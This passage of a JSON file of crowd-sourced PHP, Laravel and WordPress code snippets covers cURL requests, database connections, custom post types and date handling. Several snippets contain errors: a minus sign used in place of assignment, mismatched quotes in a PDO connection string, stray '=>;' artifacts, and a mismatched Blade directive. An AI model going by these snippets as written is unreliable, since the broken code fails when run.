  $result = curl_exec($curl);    if(!$result){die(\"Connection Failure\");}    curl_close($curl);    return $result; }\n",
    "reg_date": "2021-10-12T10:13:29.000Z"
  },
  {
    "id": 889,
    "keyword": null,
    "link": null,
    "title": " curl php show error",
    "description": "if(curl_exec($ch) === false) {     echo 'Curl error: ' . curl_error($ch); } else {     echo 'Operation completed without any errors'; }\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 890,
    "keyword": null,
    "link": null,
    "title": " curl ttest php",
    "description": "<?php         // create curl resource         $ch = curl_init();          // set url         curl_setopt($ch, CURLOPT_URL, \"example.com\");          //return the transfer as a string         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);          // $output contains the output string         $output = curl_exec($ch);          // close curl resource to free up system resources         curl_close($ch);      ?>\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 891,
    "keyword": null,
    "link": null,
    "title": " curlopt postfields php example",
    "description": "<?php  $postRequest = array(     'firstFieldData' => 'foo',     'secondFieldData' => 'bar' );  $cURLConnection = curl_init('http://hostname.tld/api'); curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $postRequest); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $apiResponse = curl_exec($cURLConnection); curl_close($cURLConnection);  // $apiResponse - available data from the API request $jsonArrayResponse - json_decode($apiResponse);\n<?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 892,
    "keyword": null,
    "link": null,
    "title": " current URL without url site laravel",
    "description": "Request::url(), Request::fullUrl(), Request::path(), Request::is()  and Request::segment().     @if (Request::path() == '/post-title') \t// Do something @endif      @if (Request::is('admin/*')) \t// Do something @endif   // Returns true for example.com/admin/post and false for example.com/admin/edit @if (Request::segment(2) == 'post') \t// Do something @endif      @if (Request::url() == 'some string') \t// Do something @endforeach      @if (str_contains(Request::fullUrl(), 'some-string')) \t// Do something @endif    $currentURL = url()->current();   dd($currentURL);  $currentURL = url()->full();     dd($currentURL);  //current() with Facade $currentURL = URL::current(); dd($currentURL);  // Get Previous URL in Laravel: $url = url()->previous(); dd($url);  //Get Current Route in Laravel: $route = Route::current()->getName(); dd($route);   \nis work {{Request::path()}} or request()->path() \n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 893,
    "keyword": null,
    "link": null,
    "title": " current loggedin user laravel",
    "description": "@auth   // user logged in   @else   // not logged in @endauth\n$user = auth()->user();  print($user->id);print($user->name);print($user->email);\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 894,
    "keyword": null,
    "link": null,
    "title": " current time in laravel migration",
    "description": "$table->timestamp('created_at')->default(DB::raw('CURRENT_TIMESTAMP'));\n$table->timestamp('created_at')->useCurrent();\n$table->timestamp('column_name')->useCurrent();\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 895,
    "keyword": null,
    "link": null,
    "title": " current timestamp carbon",
    "description": " Carbon::now()->timestamp\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 896,
    "keyword": null,
    "link": null,
    "title": " current url route laravel",
    "description": "Get the current url  here using the Request::url() method. It will return the entire URL, but strip the query string from it.  <p> Url: {{  Request::url() }} </p> Output  Url: http://localhost:8000/post/demo\nis work {{Request::path()}} or request()->path() \n\\Route::current() ############### OR #################### $request->getRequestUri()\n<p> Path: {{ Request::path() }} </p>\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 897,
    "keyword": null,
    "link": null,
    "title": " current url wordpress",
    "description": "$url = site_url(); echo $url; \nglobal $wp; echo home_url( $wp->request )\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 898,
    "keyword": null,
    "link": null,
    "title": " current user laravel",
    "description": "$user = auth()->user();  print($user->id);print($user->name);print($user->email);\n$user = Auth::user();  echo $user->id;  echo $user->name;  echo $user->email;\n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 899,
    "keyword": null,
    "link": null,
    "title": " custom 404 page codeigniter 4",
    "description": "$routes->set404Override(function(){     return view('your_filename'); }); \n#Ubuntu 18.04 1.Add this in 000-default.conf or sitename.conf inside /etc/apache2/sites-enabled/      <Directory /var/www/html>         \tOptions Indexes FollowSymLinks \t        AllowOverride All         \tRequire all granted \t</Directory>      2. And restart (sudo service apache2 restart)         \n",
    "reg_date": "2021-10-12T10:13:30.000Z"
  },
  {
    "id": 900,
    "keyword": null,
    "link": null,
    "title": " custom 404 page in laravel",
    "description": "//step 1 ) create the errors/404.blade.php in view.  // step 2 ) go to Handler.php and replace the render function to belwo function.   public function render($request, Throwable $exception)     {         if ($exception instanceof AccessDeniedHttpException) {             return response(view('errors.404'), 404);         }         return parent::render($request, $exception);     }\nA very simple one      php artisan vendor:publish --tag=laravel-errors\n/**  * Render an exception into an HTTP response.  *  * @param  \\Illuminate\\Http\\Request  $request  * @param  \\Exception  $exception  * @return \\Illuminate\\Http\\Response  */ public function render($request, Exception $exception) {     if ($this->isHttpException($exception)) {         if ($exception->getStatusCode() == 404) {             return response()->view('errors.' . '404', [], 404);         }     }       return parent::render($request, $exception); } \n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 901,
    "keyword": null,
    "link": null,
    "title": " custom post type",
    "description": "<?php $args = array(     'post_type'      => 'product',     'posts_per_page' => 10, ); $loop = new WP_Query($args); while ( $loop->have_posts() ) {     $loop->the_post();     ?>     <div class=\"entry-content\">         <?php the_title(); ?>         <?php the_content(); ?>     </div>     <?php } \n/* * Creating a function to create our CPT */   function custom_post_type() {   // Set UI labels for Custom Post Type     $labels = array(         'name'                => _x( 'Movies', 'Post Type General Name', 'twentytwenty' ),         'singular_name'       => _x( 'Movie', 'Post Type Singular Name', 'twentytwenty' ),         'menu_name'           => __( 'Movies', 'twentytwenty' ),         'parent_item_colon'   => __( 'Parent Movie', 'twentytwenty' ),         'all_items'           => __( 'All Movies', 'twentytwenty' ),         'view_item'           => __( 'View Movie', 'twentytwenty' ),         'add_new_item'        => __( 'Add New Movie', 'twentytwenty' ),         'add_new'             => __( 'Add New', 'twentytwenty' ),         'edit_item'           => __( 'Edit Movie', 'twentytwenty' ),         'update_item'         => __( 'Update Movie', 'twentytwenty' ),         'search_items'        => __( 'Search Movie', 'twentytwenty' ),         'not_found'           => __( 'Not Found', 'twentytwenty' ),         'not_found_in_trash'  => __( 'Not found in Trash', 'twentytwenty' ),     );       // Set other options for Custom Post Type           $args = array(         'label'               => __( 'movies', 'twentytwenty' ),         'description'         => __( 'Movie news and reviews', 'twentytwenty' ),         'labels'              => $labels,         // Features this CPT supports in Post Editor         'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),         // You can associate this CPT with a taxonomy or custom taxonomy.          'taxonomies'          => array( 'genres' ),         /* A hierarchical CPT is like Pages and can have         * Parent and child items. A non-hierarchical CPT         * is like Posts.         */          'hierarchical'        => false,         'public'              => true,         'show_ui'             => true,         'show_in_menu'        => true,         'show_in_nav_menus'   => true,         'show_in_admin_bar'   => true,         'menu_position'       => 5,         'can_export'          => true,         'has_archive'         => true,         'exclude_from_search' => false,         'publicly_queryable'  => true,         'capability_type'     => 'post',         'show_in_rest' => true,       );           // Registering your Custom Post Type     register_post_type( 'movies', $args );   }   /* Hook into the 'init' action so that the function * Containing our post type registration is not  * unnecessarily executed.  */   add_action( 'init', 'custom_post_type', 0 );\n$args = array(           'post_status' => 'publish',         'posts_per_page' => 5,            \t\t); \t     $loop = new WP_Query( $args );               while ( $loop->have_posts() ) : $loop->the_post();          the_title();  \tthe_excerpt();     endwhile;\n.wp-block-code { \tborder: 0; \tpadding: 0; }  .wp-block-code > div { \toverflow: auto; }  .hljs { \tbox-sizing: border-box; }  .hljs.shcb-code-table { \tdisplay: table; \twidth: 100%; }  .hljs.shcb-code-table > .shcb-loc { \tcolor: inherit; \tdisplay: table-row; \twidth: 100%; }  .hljs.shcb-code-table .shcb-loc > span { \tdisplay: table-cell; }  .wp-block-code code.hljs:not(.shcb-wrap-lines) { \twhite-space: pre; }  .wp-block-code code.hljs.shcb-wrap-lines { \twhite-space: pre-wrap; }  .hljs.shcb-line-numbers { \tborder-spacing: 0; \tcounter-reset: line; }  .hljs.shcb-line-numbers > .shcb-loc { \tcounter-increment: line; }  .hljs.shcb-line-numbers .shcb-loc > span { \tpadding-left: 0.75em; }  .hljs.shcb-line-numbers .shcb-loc::before { \tborder-right: 1px solid #ddd; \tcontent: counter(line); \tdisplay: table-cell; \tpadding: 0 0.75em; \ttext-align: right; \t-webkit-user-select: none; \t-moz-user-select: none; \t-ms-user-select: none; \tuser-select: none; \twhite-space: nowrap; \twidth: 1%; } // Register Custom Post Type - Workshop function kp_workshops() {  \t$args = array( \t\t'label' =>; __( 'Workshop', 'kp_workshops' ), \t\t'description' =>; __( 'Workshop listing', 'kp_workshops' ), \t\t'labels' =>; $labels, \t\t'supports' =>; array( 'title', 'editor', 'thumbnail', 'comments', 'revisions', 'custom-fields' ), \t\t'taxonomies' =>; array( 'category' ), \t\t'hierarchical' =>; false, \t\t'public' =>; true, \t\t'show_ui' =>; true, \t\t'show_in_menu' =>; true, \t\t'menu_position' =>; 20, \t\t'menu_icon' =>; 'dashicons-welcome-learn-more', \t\t'show_in_admin_bar' =>; true, \t\t'show_in_nav_menus' =>; true, \t\t'can_export' =>; true, \t\t'has_archive' =>; true, \t\t'exclude_from_search' =>; false, \t\t'publicly_queryable' =>; true, \t\t'capability_type' =>; 'page', \t\t'show_in_rest' =>; true, \t);  \tregister_post_type( 'workshops', $args );  } add_action( 'init', 'kp_workshops', 0 );\n// Register Custom Post Type function custom_post_type() {  \t$labels = array( \t\t'name'                  => _x( 'Post Types', 'Post Type General Name', 'text_domain' ), \t\t'singular_name'         => _x( 'Post Type', 'Post Type Singular Name', 'text_domain' ), \t\t'menu_name'             => __( 'Post Types', 'text_domain' ), \t\t'name_admin_bar'        => __( 'Post Type', 'text_domain' ), \t\t'archives'              => __( 'Item Archives', 'text_domain' ), \t\t'attributes'            => __( 'Item Attributes', 'text_domain' ), \t\t'parent_item_colon'     => __( 'Parent Item:', 'text_domain' ), \t\t'all_items'             => __( 'All Items', 'text_domain' ), \t\t'add_new_item'          => __( 'Add New Item', 'text_domain' ), \t\t'add_new'               => __( 'Add New', 'text_domain' ), \t\t'new_item'              => __( 'New Item', 'text_domain' ), \t\t'edit_item'             => __( 'Edit Item', 'text_domain' ), \t\t'update_item'           => __( 'Update Item', 'text_domain' ), \t\t'view_item'             => __( 'View Item', 'text_domain' ), \t\t'view_items'            => __( 'View Items', 'text_domain' ), \t\t'search_items'          => __( 'Search Item', 'text_domain' ), \t\t'not_found'             => __( 'Not found', 'text_domain' ), \t\t'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ), \t\t'featured_image'        => __( 'Featured Image', 'text_domain' ), \t\t'set_featured_image'    => __( 'Set featured image', 'text_domain' ), \t\t'remove_featured_image' => __( 'Remove featured image', 'text_domain' ), \t\t'use_featured_image'    => __( 'Use as featured image', 'text_domain' ), \t\t'insert_into_item'      => __( 'Insert into item', 'text_domain' ), \t\t'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ), \t\t'items_list'            => __( 'Items list', 'text_domain' ), \t\t'items_list_navigation' => __( 'Items list navigation', 'text_domain' ), \t\t'filter_items_list'     => __( 'Filter items list', 'text_domain' ), \t); \t$args = array( \t\t'label'                 => __( 'Post Type', 'text_domain' ), \t\t'description'           => __( 'Post Type Description', 'text_domain' ), \t\t'labels'                => $labels, \t\t'supports'              => false, \t\t'taxonomies'            => array( 'category', 'post_tag' ), \t\t'hierarchical'          => false, \t\t'public'                => true, \t\t'show_ui'               => true, \t\t'show_in_menu'          => true, \t\t'menu_position'         => 5, \t\t'show_in_admin_bar'     => true, \t\t'show_in_nav_menus'     => true, \t\t'can_export'            => true, \t\t'has_archive'           => true, \t\t'exclude_from_search'   => false, \t\t'publicly_queryable'    => true, \t\t'capability_type'       => 'page', \t); \tregister_post_type( 'post_type', $args );  } add_action( 'init', 'custom_post_type', 0 );\n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 902,
    "keyword": null,
    "link": null,
    "title": " custom post type with taxonomy",
    "description": "//hook into the init action and call create_book_taxonomies when it fires add_action( 'init', 'create_topics_hierarchical_taxonomy', 0 );   //create a custom taxonomy name it topics for your posts   function create_topics_hierarchical_taxonomy() {   // Add new taxonomy, make it hierarchical like categories //first do the translations part for GUI     $labels = array(     'name' => _x( 'Topics', 'taxonomy general name' ),     'singular_name' => _x( 'Topic', 'taxonomy singular name' ),     'search_items' =>  __( 'Search Topics' ),     'all_items' => __( 'All Topics' ),     'parent_item' => __( 'Parent Topic' ),     'parent_item_colon' => __( 'Parent Topic:' ),     'edit_item' => __( 'Edit Topic' ),      'update_item' => __( 'Update Topic' ),     'add_new_item' => __( 'Add New Topic' ),     'new_item_name' => __( 'New Topic Name' ),     'menu_name' => __( 'Topics' ),   );       // Now register the taxonomy     register_taxonomy('topics',array('post'), array(     'hierarchical' => true,     'labels' => $labels,     'show_ui' => true,     'show_admin_column' => true,     'query_var' => true,     'rewrite' => array( 'slug' => 'topic' ),   ));   }\n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 903,
    "keyword": null,
    "link": null,
    "title": " custom query magento 2",
    "description": "$objectManager = \\Magento\\Framework\\App\\ObjectManager::getInstance(); // Instance of object manager $resource = $objectManager->get('Magento\\Framework\\App\\ResourceConnection'); $connection = $resource->getConnection(); $tableName = $resource->getTableName('employee'); //gives table name with prefix  //Select Data from table $sql = \"Select * FROM \" . $tableName; $result = $connection->fetchAll($sql); // gives associated array, table fields as key in array.  //Delete Data from table $sql = \"Delete FROM \" . $tableName.\" Where emp_id = 10\"; $connection->query($sql);  //Insert Data into table $sql = \"Insert Into \" . $tableName . \" (emp_id, emp_name, emp_code, emp_salary) Values ('','XYZ','ABD20','50000')\"; $connection->query($sql);  //Update Data into table $sql = \"Update \" . $tableName . \"Set emp_salary = 20000 where emp_id = 12\"; $connection->query($sql);\n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 904,
    "keyword": null,
    "link": null,
    "title": " custom rule laravel validation",
    "description": "public function store() {     $this->validate(request(), [         'song' => [function ($attribute, $value, $fail) {             if ($value <= 10) {                 $fail(':attribute needs more cowbell!');             }         }]     ]); } \nphp artisan make:rule Uppercase\nphp artisan make:rule RuleName\n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 905,
    "keyword": null,
    "link": null,
    "title": " custom widget area wordpress",
    "description": "<?php     /**  * Register our sidebars and widgetized areas. - Most times you can place this instead your fuction file.  *  */ function arphabet_widgets_init() {  \tregister_sidebar( array( \t\t'name'          => 'Home right sidebar', \t\t'id'            => 'home_right_1', \t\t'before_widget' => '<div>', \t\t'after_widget'  => '</div>', \t\t'before_title'  => '<h2 class=\"rounded\">', \t\t'after_title'   => '</h2>', \t) );  } add_action( 'widgets_init', 'arphabet_widgets_init' ); ?>    /* show sidebar - template file */   <?php if ( is_active_sidebar( 'home_right_1' ) ) : ?> \t<div id=\"primary-sidebar\" class=\"primary-sidebar widget-area\" role=\"complementary\"> \t\t<?php dynamic_sidebar( 'home_right_1' ); ?> \t</div><!-- #primary-sidebar --> <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 906,
    "keyword": null,
    "link": null,
    "title": " database connection in php",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n$servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\";   Simplified  $conn = mysqli_connect('localhost', 'username', 'password'); $database = mysqli_select_db($conn, 'database');\n<?php ///////////neha jaiswal///// /////set variable///////// $serve=\"localhost\"; $user=\"root\"; $password=\"\"; $db=\"cart_system\";///database name ///create connection with db//// $conn=mysqli_connect($serve,$user,$password,$db); ////check condition for connection fail or not  if ($conn) {  echo \"connection success\";   }else {echo \"connection unsuccess\";   }   ?>\n<?php  $hostName = 'localhost'; $userNmame = 'root'; $password = ''; $dbname = 'topproduct'; $db_name = \"mysql:host=$hostName;dbname=$dbname\"; $conn = new PDO($db_name,$userNmame,$password);  if(!$conn){     echo 'Error database connection';     } \nJust include this Temlate in other file using PHP Include/Require Keywords  And Make Connection In One Shot :)  <?php        // echo \"Welcome to Connecting of DB Tutorial!\";     // echo \"<br>\";      // 1. PDO - Php Data Objects     // 2. MySQLi extension      // Set Connection Variable     $server = \"localhost\";     $username = \"root\";     $password = \"\";     $database = \"test\";      // Create A Connection     $con = mysqLi_connect($server, $username, $password, $database);       // Check For Connection      if(!$con){         die (\"Connection Terminated! by Die() function\". mysqLi_connect_error());             }     else {         echo \"Connection Succefully Happened! <br>\";     }       ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>\n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 907,
    "keyword": null,
    "link": null,
    "title": " database connection in php pdo",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n<?php class database{   private $host = \"localhost\";   private $db_name = \"php_basic\";   private $username = \"root\";   private $password = \"\";   private $conn;    // connect database using PDO   function connect_pdo(){     try{       $this->conn = new PDO(\"mysql:host=\".$this->host.\";dbname=\".$this->db_name, $this->username, $this->password);       return $this->conn;     }     catch(PDOException $ex){       echo \"Connection Error -->> \",$ex->getMessage();       echo \"<br>Error Code -->> \",$ex->getCode();       echo \"<br>Error occur in File -->> \",$ex->getFile();       echo \"<br>Error occur on Line no -->> \",$ex->getLine();        $this->conn = null; // close connection in PDO     }   } } ?>    //how to use  <?php include 'connect_db.php'; $database=new database(); $db = $database->connect_pdo(); ?>\n<?php     \t$pdo = new PDO('mysql:host=localhost;   \t\t\t\tdbname=the_name_of_your_databe,   \t\t\t\t'username',                  'password''); # by default your username is root  # if you don't have a password don't fill in it  #(optional) :  \t$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \t$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);  ?>\n<?php $pdo = new PDO('mysql:host=localhost;dbname=databasename', 'username', 'password'); ?> \n<?php    $db_src    = \"mysql:host=localhost;dbname=databasename\";   $db_user   = \"root\";   $db_pass   = \"\";   try{     $connect = new PDO($db_src, $db_user, $db_pass);     $connect->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);   }   catch(PDOEXCEPTION $err){     echo \"Failed To Connect. Error \" . $err->getMessage();   } /* Variable $connect will be used to execute DB Statements*/\n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 908,
    "keyword": null,
    "link": null,
    "title": " database connectivity in php",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n<?php ///////////neha jaiswal///// /////set variable///////// $serve=\"localhost\"; $user=\"root\"; $password=\"\"; $db=\"cart_system\";///database name ///create connection with db//// $conn=mysqli_connect($serve,$user,$password,$db); ////check condition for connection fail or not  if ($conn) {  echo \"connection success\";   }else {echo \"connection unsuccess\";   }   ?>\n<?php  $hostName = 'localhost'; $userNmame = 'root'; $password = ''; $dbname = 'topproduct'; $db_name = \"mysql:host=$hostName;dbname=$dbname\"; $conn = new PDO($db_name,$userNmame,$password);  if(!$conn){     echo 'Error database connection';     } \nJust include this Temlate in other file using PHP Include/Require Keywords  And Make Connection In One Shot :)  <?php        // echo \"Welcome to Connecting of DB Tutorial!\";     // echo \"<br>\";      // 1. PDO - Php Data Objects     // 2. MySQLi extension      // Set Connection Variable     $server = \"localhost\";     $username = \"root\";     $password = \"\";     $database = \"test\";      // Create A Connection     $con = mysqLi_connect($server, $username, $password, $database);       // Check For Connection      if(!$con){         die (\"Connection Terminated! by Die() function\". mysqLi_connect_error());             }     else {         echo \"Connection Succefully Happened! <br>\";     }       ?>\n",
    "reg_date": "2021-10-12T10:13:31.000Z"
  },
  {
    "id": 909,
    "keyword": null,
    "link": null,
    "title": " date add one day php",
    "description": "<?php  // PHP program to add days to $Date     // Declare a date  $date = \"2019-05-10\";     // Add days to date and display it  echo date('Y-m-d', strtotime($date. ' + 10 days'));     ?> \n<?php $stop_date = '2009-09-30 20:24:00'; echo 'date before day adding: ' . $stop_date;  $stop_date = date('Y-m-d H:i:s', strtotime($stop_date . ' +1 day')); echo 'date after adding 1 day: ' . $stop_date; ?>\n$start_date = \"2015/03/02\";   $date = strtotime($start_date); $date = strtotime(\"+7 day\", $date); echo date('Y/m/d', $date); \n$created_at=date('Y-m-d H:i:s', strtotime(date(\"Y-m-d H:i:s\") . ' +1 day'));\n$date = new DateTime('2000-01-01'); $date->add(new DateInterval('P1D'));\n$date = date('Y-m-d', strtotime(\"+1 day\")); \n",
    "reg_date": "2021-10-12T10:13:32.000Z"
  },
  {
    "id": 910,
    "keyword": null,
    "link": null,
    "title": " date and time in php",
    "description": "$today = date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                           // 03.10.01 $today = date(\"j, n, Y\");                         // 10, 3, 2001 $today = date(\"Ymd\");                             // 20010310 $today = date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day (10&egrave;me jour du mois). $today = date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\e\\s\\t\\ \\l\\e\\ \\m\\o\\i\\s'); // 17:03:18 m est le mois $today = date(\"H:i:s\");                           // 17:16:18 $today = date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 (le format DATETIME de MySQL)\n//Get current date time in PHP  // Simply: $date = date('Y-m-d H:i:s');  // Or: $date = date('Y/m/d H:i:s');  // This would return the date in the following formats respectively: $date = '2012-03-06 17:33:07'; // Or $date = '2012/03/06 17:33:07';  /**   * This time is based on the default server time zone.  * If you want the date in a different time zone,  * say if you come from Nairobi, Kenya like I do, you can set  * the time zone to Nairobi as shown below.  */  date_default_timezone_set('Africa/Nairobi');  // Then call the date functions $date = date('Y-m-d H:i:s'); // Or $date = date('Y/m/d H:i:s');  // date_default_timezone_set() function is however // supported by PHP version 5.1.0 or above. \n$timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day);\n$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n$dateTime = new \\DateTime(); $dateTime->format('Y-m-d H:i:s');\necho date('d/m/Y h:i:s a');\t// 01/02/2020 01:01:30 am // d - The day of the month (from 01 to 31) // D - A textual representation of a day (three letters) // j - The day of the month without leading zeros (1 to 31) // l (lowercase 'L') - A full textual representation of a day // N - The ISO-8601 numeric representation of a day (1 for Monday, 7 for Sunday) // S - The English ordinal suffix for the day of the month (2 characters st, nd, rd or th. Works well with j) // w - A numeric representation of the day (0 for Sunday, 6 for Saturday) // z - The day of the year (from 0 through 365) // W - The ISO-8601 week number of year (weeks starting on Monday) // F - A full textual representation of a month (January through December) // m - A numeric representation of a month (from 01 to 12) // M - A short textual representation of a month (three letters) // n - A numeric representation of a month, without leading zeros (1 to 12) // t - The number of days in the given month // L - Whether it's a leap year (1 if it is a leap year, 0 otherwise) // o - The ISO-8601 year number // Y - A four digit representation of a year // y - A two digit representation of a year // a - Lowercase am or pm // A - Uppercase AM or PM // B - Swatch Internet time (000 to 999) // g - 12-hour format of an hour (1 to 12) // G - 24-hour format of an hour (0 to 23) // h - 12-hour format of an hour (01 to 12) // H - 24-hour format of an hour (00 to 23) // i - Minutes with leading zeros (00 to 59) // s - Seconds, with leading zeros (00 to 59) // u - Microseconds (added in PHP 5.2.2) // e - The timezone identifier (Examples: UTC, GMT, Atlantic/Azores) // I (capital i) - Whether the date is in daylights savings time (1 if Daylight Savings Time, 0 otherwise) // O - Difference to Greenwich time (GMT) in hours (Example: +0100) // P - Difference to Greenwich time (GMT) in hours:minutes (added in PHP 5.1.3) // T - Timezone abbreviations (Examples: EST, MDT) // Z - Timezone offset in seconds. The offset for timezones west of UTC is negative (-43200 to 50400) // c - The ISO-8601 date (e.g. 2013-05-05T16:34:42+00:00) // r - The RFC 2822 formatted date (e.g. Fri, 12 Apr 2013 12:01:05 +0200) // U - The seconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\n",
    "reg_date": "2021-10-12T10:13:32.000Z"
  },
  {
    "id": 911,
    "keyword": null,
    "link": null,
    "title": " date between query in codeigniter",
    "description": "$this->db->where('sell_date BETWEEN \"'. date('Y-m-d', strtotime($start_date)). '\" and \"'. date('Y-m-d', strtotime($end_date)).'\"');\n",
    "reg_date": "2021-10-12T10:13:32.000Z"
  },
  {
    "id": 912,
    "keyword": null,
    "link": null,
    "title": " date casting from datetime to d-m-Y laravel",
    "description": "/** * The attributes that should be cast. * * @var array */ protected $casts = [    'created_at' => 'datetime:Y-m-d',    'updated_at' => 'datetime:Y-m-d',    'deleted_at' => 'datetime:Y-m-d h:i:s' ]; \n",
    "reg_date": "2021-10-12T10:13:32.000Z"
  },
  {
    "id": 913,
    "keyword": null,
    "link": null,
    "title": " date casting from datetime to d-m-Y laravel using cast",
    "description": "/** * The attributes that should be cast. * * @var array */ protected $casts = [    'created_at' => 'datetime:Y-m-d',    'updated_at' => 'datetime:Y-m-d',    'deleted_at' => 'datetime:Y-m-d h:i:s' ]; \n",
    "reg_date": "2021-10-12T10:13:32.000Z"
  },
  {
    "id": 914,
    "keyword": null,
    "link": null,
    "title": " date comparison function in php",
    "description": "$today = date(\"Y-m-d\"); $expire = $row->expireDate; //from database  $today_time = strtotime($today); $expire_time = strtotime($expire);  if ($expire_time < $today_time) { /* do Something */ }\ndev:~# php <?php date_default_timezone_set('Europe/London');  $d1 = new DateTime('2008-08-03 14:52:10'); $d2 = new DateTime('2008-01-03 11:11:10'); var_dump($d1 == $d2); var_dump($d1 > $d2); var_dump($d1 < $d2); ?> bool(false) bool(true) bool(false) dev:~# php -v PHP 5.2.6-1+lenny3 with Suhosin-Patch 0.9.6.2 (cli) (built: Apr 26 2009 20:09:03) Copyright (c) 1997-2008 The PHP Group Zend Engine v2.2.0, Copyright (c) 1998-2008 Zend Technologies dev:~#\nSelect if(Date('2020-10-01') > Date('2020-11-01'), '1', '2' ) as rslt_date\n$date1 = \"2021-01-15\"; $date2 = \"2021-01-18\";  if ($date1 < $date2) {  \techo \"$date1 is earlier than $date2\"; } else { \techo \"$date1 is later than $date2\"; }\n",
    "reg_date": "2021-10-12T10:13:32.000Z"
  },
  {
    "id": 915,
    "keyword": null,
    "link": null,
    "title": " date default timezone set for india in php",
    "description": "<?php \tdate_default_timezone_set(\"Asia/Kolkata\");   //India time (GMT+5:30) \techo date('d-m-Y H:i:s'); ?>\n Inside config/app.php  replace timezone  'timezone' => 'Asia/Kolkata'\n",
    "reg_date": "2021-10-12T10:13:32.000Z"
  },
  {
    "id": 916,
    "keyword": null,
    "link": null,
    "title": " date default timezone set for india in php laravel",
    "description": "<?php \tdate_default_timezone_set(\"Asia/Kolkata\");   //India time (GMT+5:30) \techo date('d-m-Y H:i:s'); ?>\n Inside config/app.php  replace timezone  'timezone' => 'Asia/Kolkata'\n",
    "reg_date": "2021-10-12T10:13:32.000Z"
  },
  {
    "id": 917,
    "keyword": null,
    "link": null,
    "title": " date default timezone set india",
